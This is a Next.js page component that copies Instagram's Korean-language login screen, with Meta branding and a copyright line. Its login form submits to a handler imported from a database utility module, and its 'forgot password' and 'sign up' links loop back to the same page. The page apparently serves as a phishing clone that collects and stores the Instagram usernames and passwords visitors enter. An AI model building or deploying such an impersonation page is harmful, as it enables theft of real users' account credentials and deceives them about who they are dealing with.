import styles from './page.module.css';
import Header from "../../component/Header";
import LoginForm from "@/app/component/loginForm";
import { handleSubmit } from '@/utils/database';

export default async function Instagram(){ 

  const title = '로그인';

  return (
    <>
    <Header />
    <title>{title}</title>
    <div className={styles.loginWrap}>
    <div className={styles.container}>
    <div className={styles.box}>
        <div className={styles.heading}></div>
        <form action={ handleSubmit } method="post" class="login-form">
        <LoginForm />
        <div className={styles.other}>
            <button className={styles.fbLoginBtn} type="button">
                <i class="fa fa-facebook-official fb-icon"></i>
                <span>Facebook으로 로그인</span>
            </button>
            <a className={styles.forgotPassword} href="/login/instagram">비밀번호를 잊으셨나요?</a>
        </div>
        </form>
    </div>
    <div className={styles.box}>
        <p>계정이 없으신가요? <a className={styles.signup} href="/login/instagram">가입하기</a></p>
    </div>
    <div className={styles.copyrightWrap}>
      <span className={styles.copyright}>© 2023 Instagram from Meta</span>
    </div>
    </div>
    </div>
    </>
  )
} 